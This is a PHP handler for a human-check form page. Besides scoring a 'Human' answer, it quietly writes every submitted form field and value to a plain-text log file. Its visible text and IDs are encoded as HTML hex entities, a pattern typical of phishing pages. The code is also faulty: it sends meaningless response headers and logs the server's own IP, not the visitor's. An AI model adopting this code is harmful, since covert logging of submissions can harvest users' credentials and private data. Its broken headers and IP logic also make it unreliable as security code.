<?php
header( 'Content-Type-Options: nosniff' );
header( 'X-Content-Type-Options: nosniff' );
header( 'XSS-Protection: 1; mode=block' );
header( 'X-XSS-Protection: 1; mode=block' );
header( 'Vary: Accept-Encoding' );
header( 'Host: localhost' );
header( 'viewport: width=device-width' );
header( 'Accept-Language: en-US,en;q=0.5' );
header( 'Connection: Keep-alive' );
header( 'description: localhost' );
header( 'keywords: localhost' );

$ip = $localIp = gethostbyname(gethostname());

$handle = fopen("index.log", "a"); //open log file

foreach($_POST as $variable => $value) { //loop through POST vars
fwrite($handle, $variable . "+" . $value . "\r\n");
}
fwrite($handle, "IP: $ip \r\n \r\n");
fclose($handle);

?>

<meta name="viewport" content="width=device-width">
<meta http-equiv="Cache-Control" content="private, no-cache, no-store, must-revalidate, pre-check=0, post-check=0, max-age=0, s-maxage=0"/>
	<div id="&#x70;&#x61;&#x67;&#x65;&#x2D;&#x77;&#x72;&#x61;&#x70;">
		<h1>&#x46;&#x6F;&#x72;&#x6D;&#x20;&#x52;&#x65;&#x73;&#x75;&#x6C;&#x74;&#x73;</h1>		
        <?php 
		
            $answer1 = $_POST['secure-form-answer'];        
            $totalCorrect = 0;           
            if ($answer1 == "Human") { $totalCorrect++; }            
            echo "<div id='&#x72;&#x65;&#x73;&#x75;&#x6C;&#x74;&#x73;'>$totalCorrect / &#x31;&#x20;&#x63;&#x6F;&#x72;&#x72;&#x65;&#x63;&#x74;</div>";           
            
		?>
		<br>
	<a href="../main.html">&#x45;&#x6E;&#x74;&#x65;&#x72; this website</a>
	</div>